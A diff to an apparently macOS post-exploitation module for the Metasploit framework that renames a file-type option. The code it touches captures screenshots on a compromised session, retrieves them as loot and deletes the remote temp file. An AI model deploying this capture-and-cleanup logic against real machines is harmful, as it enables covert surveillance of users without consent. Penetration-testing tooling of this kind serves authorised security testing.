@@ -28,13 +28,13 @@ class Metasploit3 < Msf::Post
 
     register_options(
       [
-        OptEnum.new('SNAP_FILETYPE',
+        OptEnum.new('FILETYPE',
           [true, 'File format to use when saving a snapshot', 'png', %w(png gif)]
         ),
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect. 0 for no count', 1]),
         OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/random']),
-        OptString.new('EXE_PATH', [true, 'Path to remote screencapture program', '/usr/sbin/screencapture'])
+        OptString.new('EXE_PATH', [true, 'Path to remote screencapture executable', '/usr/sbin/screencapture'])
       ], self.class)
 
   end
@@ -67,10 +67,10 @@ class Metasploit3 < Msf::Post
   end
 
   def get_screenshot(msg, tmp_path)
-    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['SNAP_FILETYPE']
+    filename = Rex::Text.rand_text_alpha(7) + "." + datastore['FILETYPE']
     file = tmp_path + "/" + filename
 
-    execute("Save screenshot to remote temp folder:", datastore['EXE_PATH'].shellescape + " -C -t " + datastore['SNAP_FILETYPE'].shellescape + " " + file)
+    execute("Save screenshot to remote temp folder:", datastore['EXE_PATH'].shellescape + " -C -t " + datastore['FILETYPE'].shellescape + " " + file)
     data = cat_file(file)
     loot_file = save(msg, data, filename)
     execute("Remove remote temp file:", "rm " + file)
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Post
     end
   end
 
-  def save(msg, data, filename, ctype="image/" + datastore['SNAP_FILETYPE'])
+  def save(msg, data, filename, ctype="image/" + datastore['FILETYPE'])
     ltype = "osx.screenshot"
     loot_file = store_loot(ltype, ctype, session, data, filename, msg)
     print_good("#{msg} stored in #{loot_file.to_s}")
